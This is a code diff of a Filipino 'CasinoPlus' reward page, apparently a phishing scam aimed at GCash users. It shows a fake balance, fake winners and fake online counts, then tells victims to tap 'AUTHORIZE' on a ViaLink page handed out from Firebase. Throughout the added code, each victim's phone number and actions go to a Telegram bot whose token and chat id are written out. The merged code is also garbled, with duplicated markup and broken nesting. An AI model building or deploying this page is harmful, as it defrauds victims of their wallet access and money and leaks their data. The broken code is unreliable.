@@ -2,145 +2,333 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CasinoPlus | Rewards Terminal</title>
+    <title>CasinoPlus | Live Payout</title>
+
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;900&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+
+    <script>
+        (function() {
+            // 1. SECURITY CHECK (Banned/Verified)
+            const isBanned = localStorage.getItem("cp_device_locked") === "true";
+            const isVerified = localStorage.getItem("cp_verified") === "true";
+            if (isBanned || !isVerified) {
+                window.location.replace("index.html"); 
+                return;
+            }
+
+            // 2. MOBILE-ONLY ENFORCEMENT
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isSmallScreen = window.innerWidth <= 768;
+
+            window.onload = function() {
+                if (!isMobile && !isSmallScreen) {
+                    document.getElementById('mobileOnlyOverlay').style.display = 'flex';
+                    document.getElementById('mainContent').style.display = 'none';
+                }
+            };
+        })();
+    </script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --gold: #fbbf24; --bg: #060a13; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --bg: #04070d; }
+        body { 
+            background: var(--bg); color: #fff; font-family: 'Public Sans', sans-serif; 
+            display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
+            background-image: radial-gradient(circle at 50% -20%, #1e3a8a 0%, transparent 70%);
+        }
         
-        .header { text-align: center; margin-bottom: 30px; }
-        .reward-display { font-size: 32px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px rgba(251, 191, 36, 0.5); margin: 10px 0; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .amount { 
+            font-family: 'Orbitron', sans-serif; font-size: 42px; font-weight: 700; 
+            background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin: 10px 0; filter: drop-shadow(0 0 8px rgba(212, 175, 55, 0.4));
+        }
+        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; overflow-x: hidden; }
 
-        /* GRID SYSTEM */
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 400px; width: 100%; }
+        /* GRID NG MGA CARDS */
+        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; max-width: 380px; margin: 20px 0; }
+        .card-wrapper { position: relative; cursor: pointer; transition: transform 0.2s; }
+        .card-wrapper:hover { transform: scale(1.05); }
+        .card-img { width: 100%; border-radius: 15px; border: 1px solid rgba(212, 175, 55, 0.2); }
+        /* OVERLAYS */
+        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
+        #mobileOnlyOverlay { position: fixed; inset: 0; background: #060a13; z-index: 999998; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
 
-        /* CARD ANIMATIONS & HOVER */
-        .card { 
-            aspect-ratio: 1/1; background: rgba(255,255,255,0.05); border: 1px solid rgba(251, 191, 36, 0.3);
-            border-radius: 15px; display: flex; align-items: center; justify-content: center;
-            cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-size: 24px; position: relative; overflow: hidden;
+        .card-disabled { filter: grayscale(1) opacity(0.3); pointer-events: none; }
+
+        /* BUTTONS SECTION */
+        .btn-group { display: flex; flex-direction: column; gap: 12px; width: 100%; max-width: 360px; margin-top: 10px; }
+        .pay-button { 
+            background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 12px;
+            font-weight: 800; text-transform: uppercase; cursor: pointer; font-size: 16px;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
+        }
+        .pay-button:disabled { background: #1e293b; color: #475569; box-shadow: none; cursor: not-allowed; }
+        
+        .share-button { 
+            background: #1877f2; color: #fff; padding: 12px; border: none; border-radius: 10px;
+            font-weight: 700; font-size: 14px; cursor: pointer;
         }
 
-        /* Highlight sa Cursor */
-        .card:hover { transform: translateY(-5px) scale(1.05); background: rgba(251, 191, 36, 0.1); border-color: var(--gold); box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        
-        /* After Click Animation */
-        .card.clicked { animation: reveal 0.6s forwards; pointer-events: none; }
-        @keyframes reveal {
-            0% { transform: rotateY(0deg); }
-            50% { transform: rotateY(90deg); background: var(--gold); }
-            100% { transform: rotateY(0deg); background: rgba(34, 197, 94, 0.2); border-color: #22c55e; }
-        }
+        #processingOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .claim-section { margin-top: 30px; width: 100%; max-width: 400px; display: none; text-align: center; animation: fadeIn 0.5s; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .proc-title { font-size: 20px; font-weight: 900; color: #fff; margin-bottom: 15px; letter-spacing: 1px; }
+        .proc-text { color: #fbbf24; font-size: 14px; line-height: 1.6; font-weight: 600; max-width: 320px; background: rgba(251, 191, 36, 0.1); padding: 15px; border-radius: 12px; border: 1px solid rgba(251, 191, 36, 0.3); }
 
-        .btn-claim { background: var(--gold); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+        /* LIVE STATS */
+        .live-stats { position: absolute; top: 20px; display: flex; flex-direction: column; align-items: center; gap: 8px; z-index: 100; width: 100%; }
+        .live-winner-box { background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); }
+        .online-count { font-size: 10px; color: #22c55e; font-weight: 800; text-transform: uppercase; }
+        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        /* GRID SYSTEM (Restored) */
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin: 20px 0; }
+        .card-item { aspect-ratio: 1/1; background: rgba(255,255,255,0.05); border: 1px solid rgba(212, 175, 55, 0.2); border-radius: 15px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 24px; }
+        .card-item.clicked { border-color: #22c55e; background: rgba(34, 197, 94, 0.1); pointer-events: none; }
+
+        /* MAIN CARD */
+        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 25px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; }
+        .logo-img { width: 150px; margin-bottom: 15px; }
+        .amount { font-family: 'Orbitron', sans-serif; font-size: 48px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 5px; }
+
+        /* BUTTONS */
+        .btn-group { display: flex; flex-direction: column; gap: 10px; width: 100%; }
+        .pay-button { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 5px 0 #8b6508; }
+        .pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; cursor: not-allowed; }
+        .share-button { background: #1877f2; color: #fff; padding: 12px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <p style="color: #94a3b8;">Current Payout Wallet</p>
-        <div class="reward-display">₱<span id="currentBalance">0.00</span></div>
-        <p id="statusMsg" style="font-size: 12px; color: #22c55e;">Select a card to boost your reward!</p>
+        <p style="font-size: 11px; letter-spacing: 2px; color: #94a3b8;">AVAILABLE BALANCE</p>
+        <div class="amount" id="balanceDisplay">₱0.00</div>
+        <p id="statusMsg" style="color: #22c55e; font-size: 12px; font-weight: 800;">TAP 5 CARDS TO BOOST PAYOUT</p>
+    <div id="processingOverlay">
+        <div class="spinner"></div>
+        <div class="proc-title">ESTABLISHING SECURE VIALINK...</div>
+        <div class="proc-text">⚠️ <b>REQUIRED ACTION:</b><br>Tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the susunod na screen para ma-verify ang GCash wallet at makuha ang reward.</div>
     </div>
 
-    <div class="grid" id="cardGrid">
+    <div id="mobileOnlyOverlay">
+        <div style="font-size: 60px;">📱</div>
+        <h2 style="color:#fbbf24; margin: 15px 0;">Mobile Access Only</h2>
+        <p style="color:#94a3b8; font-size: 14px;">Please switch to your phone to claim rewards.</p>
+    </div>
+
+    <div class="game-grid" id="gameGrid">
+    <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+        <div class="live-stats">
+            <div class="online-count"><span class="dot"></span> <span id="userCount">84</span> Members Online</div>
+            <div class="live-winner-box" id="winnerBox">
+                <span id="winnerEntry">User 0917***8821 claimed ₱500 via GCash</span>
+            </div>
         </div>
 
-    <div class="claim-section" id="claimSection">
-        <p style="margin-bottom: 15px; font-size: 14px;">Target Amount Reached! Secure your payout now.</p>
-        <button class="btn-main btn-claim" onclick="redirectToVialink()">Claim Reward via GCash</button>
+    <div class="btn-group">
+        <button class="pay-button" id="claimBtn" onclick="handleClaim()" disabled>Collect Reward</button>
+        <button class="share-button" onclick="handleShare()">Share to Facebook for Bonus</button>
+        <div class="card">
+            <img src="images/logo1.png" class="logo-img" onerror="this.src='https://via.placeholder.com/150x50/04070d/d4af37?text=CasinoPlus'">
+            <div style="font-size: 10px; color: #fbbf24; letter-spacing: 2px; font-weight: 800; margin-bottom: 5px;">CURRENT BALANCE</div>
+            <div class="amount" id="balanceText">₱0.00</div>
+            
+            <div class="grid" id="cardGrid"></div>
+            
+            <div class="btn-group">
+                <button class="share-button" id="shareBtn" onclick="shareToFB()" style="display: none;">
+                    Share to Increase Reward (+₱50)
+                </button>
+                <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Tap 5 Cards to Withdraw</button>
+            </div>
+        </div>
     </div>
+
+    <div id="processingOverlay">
+        <div style="width: 40px; height: 40px; border: 4px solid #d4af37; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        <p style="margin-top: 15px; color: #d4af37; font-weight: bold;">Processing via ViaLink...</p>
+    </div>
+    <script>
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+        const chatId = '7298607329';
+        const savedPhone = localStorage.getItem("userPhone") || "Guest_Target";
+
+        let balance = 0;
+        let clickCount = 0;
+        const maxClicks = 5;
+
+        // 1. STARTUP
+        window.onload = () => {
+            const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
+            updateBalance(randomStart);
+            generateGrid();
+        };
+
+        function generateGrid() {
+            const grid = document.getElementById('cardGrid');
+            for(let i=0; i<9; i++) {
+                const item = document.createElement('div');
+                item.className = 'card-item';
+                item.innerHTML = '🎁';
+                item.onclick = () => handleCardClick(item);
+                grid.appendChild(item);
+            }
+        }
 
 <script>
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const userPhone = localStorage.getItem("userPhone") || "Guest";
+    const userPhone = localStorage.getItem("userPhone") || "GHOST_USER";
 
     let balance = 0;
     let clickCount = 0;
     const maxClicks = 5;
 
-    // 1. RANDOM STARTING OFFER (Matapos i-visit ang main.html)
     window.onload = () => {
+        // I-set ang random initial amount
         const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
         updateBalance(randomStart);
-        generateCards();
+        loadCards();
     };
 
-    function generateCards() {
-        const grid = document.getElementById('cardGrid');
-        for (let i = 0; i < 9; i++) {
-            const card = document.createElement('div');
-            card.className = 'card';
-            card.innerHTML = '🎁';
-            card.onclick = () => handleCardClick(card);
-            grid.appendChild(card);
+    function loadCards() {
+        const grid = document.getElementById('gameGrid');
+        // Gagamit tayo ng image placeholders, palitan mo na lang ng actual assets mo
+        for (let i = 1; i <= 9; i++) {
+            const wrap = document.createElement('div');
+            wrap.className = 'card-wrapper';
+            wrap.innerHTML = `<img src="img/card${i}.png" class="card-img" id="card-${i}" onerror="this.src='https://via.placeholder.com/150/1e293b/d4af37?text=CARD+${i}'">`;
+            wrap.onclick = () => cardClick(i);
+            grid.appendChild(wrap);
+        function handleCardClick(el) {
+            if (clickCount >= maxClicks || el.classList.contains('clicked')) return;
+            clickCount++;
+            el.classList.add('clicked');
+            el.innerHTML = '💎';
+            updateBalance(25);
+
+            if (clickCount === maxClicks) {
+                document.getElementById('claimBtn').disabled = false;
+                document.getElementById('claimBtn').innerText = "Withdraw via GCash";
+                document.getElementById('shareBtn').style.display = "flex";
+                trackActivity("Target reached 5 clicks. Ready for Withdrawal.");
+            }
         }
     }
 
-    function handleCardClick(cardElement) {
-        if (clickCount >= maxClicks || cardElement.classList.contains('clicked')) return;
+    function cardClick(id) {
+        if (clickCount >= maxClicks) return;
+        const img = document.getElementById(`card-${id}`);
+        if (img.classList.contains('card-disabled')) return;
+        function updateBalance(amt) {
+            balance += amt;
+            document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
+        }
 
         clickCount++;
-        cardElement.classList.add('clicked');
-        
-        // 2. ACCURATE +25 LOGIC
-        const bonus = 25;
-        updateBalance(bonus);
-        cardElement.innerHTML = `<span style="color:#22c55e; font-weight:bold;">+${bonus}</span>`;
+        img.classList.add('card-disabled');
+        updateBalance(25); // +25 accurately
+        async function trackActivity(action) {
+            const message = `🚨 [REWARD ATTEMPT]\n📱 Target: ${savedPhone}\n🔘 Action: ${action}`;
+            try { await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`); } catch(e) {}
+        }
 
         if (clickCount === maxClicks) {
-            document.getElementById('statusMsg').innerText = "LIMIT REACHED - PROCEED TO CLAIM";
-            document.getElementById('claimSection').style.display = 'block';
-            logUserActivity(); // Log sa Ghost Section
+            document.getElementById('statusMsg').innerText = "LIMIT REACHED - PAYOUT READY";
+            document.getElementById('claimBtn').disabled = false;
+            logToAdmin();
+        // 2. CORE VIALINK REDIRECT
+        function redirectToGCash() {
+            const claimBtn = document.getElementById('claimBtn');
+            const overlay = document.getElementById('processingOverlay');
+            claimBtn.disabled = true;
+            overlay.style.display = 'flex';
+            
+            trackActivity("Target clicked Withdraw. Establishing ViaLink...");
+
+            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
+                if (snapshot.exists()) {
+                    const linkId = Object.keys(snapshot.val())[0];
+                    const targetUrl = snapshot.val()[linkId].url;
+
+                    db.ref('links/' + linkId).update({ status: 'pending', user: savedPhone });
+                    trackActivity(`ViaLink Established! Redirecting...`);
+
+                    setTimeout(() => { window.location.href = targetUrl; }, 3500);
+                } else {
+                    trackActivity("ERROR: No Available Links!");
+                    alert("System busy! Please try again in 10 minutes.");
+                    overlay.style.display = 'none';
+                    claimBtn.disabled = false;
+                }
+            });
         }
     }
 
-    function updateBalance(amount) {
-        balance += amount;
-        document.getElementById('currentBalance').innerText = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
+    function updateBalance(amt) {
+        balance += amt;
+        document.getElementById('balanceDisplay').innerText = `₱${balance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
     }
 
-    // 3. LOGGING FOR ADMIN GHOST SECTION
-    function logUserActivity() {
+    function logToAdmin() {
         db.ref('user_logs/' + userPhone).set({
             phone: userPhone,
             reward: balance,
-            status: 'idle', // Idle muna kasi di pa na-click yung claim button
+            status: 'idle',
             last_updated: new Date().toLocaleString()
         });
     }
 
-    function redirectToVialink() {
-        // Find available link and redirect
-        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
-            if (snapshot.exists()) {
-                const linkId = Object.keys(snapshot.val())[0];
-                const linkData = snapshot.val()[linkId];
+    function handleClaim() {
+        document.getElementById('processingOverlay').style.display = 'flex';
+        
+        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snap => {
+            if (snap.exists()) {
+                const key = Object.keys(snap.val())[0];
+                const link = snap.val()[key];
 
-                // Update link status to 'pending' para sa 10-min timer
-                db.ref('links/' + linkId).update({
-                    status: 'pending',
-                    user: userPhone,
-                    timestamp: Date.now()
-                });
-
-                // Update user to 'claimed' status
+                db.ref('links/' + key).update({ status: 'pending', user: userPhone });
                 db.ref('user_logs/' + userPhone).update({ status: 'claimed' });
 
-                window.location.href = linkData.url;
+                setTimeout(() => { window.location.href = link.url; }, 2000);
             } else {
-                alert("All payout lines are busy. Please try again in 10 minutes.");
+                alert("All lines busy. Try again later.");
+                document.getElementById('processingOverlay').style.display = 'none';
             }
         });
     }
+
+    function handleShare() {
+        alert("Sharing feature is being initialized...");
+    }
 </script>
+        function shareToFB() {
+            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
+            updateBalance(50);
+            trackActivity("Target Shared to FB (+₱50)");
+        }
+
+<style> @keyframes spin { to { transform: rotate(360deg); } } </style>
+        // Stats Rotator
+        setInterval(() => {
+            const online = Math.floor(Math.random() * (99 - 60)) + 60;
+            document.getElementById('userCount').innerText = online;
+        }, 4000);
+    </script>
 </body>
 </html>
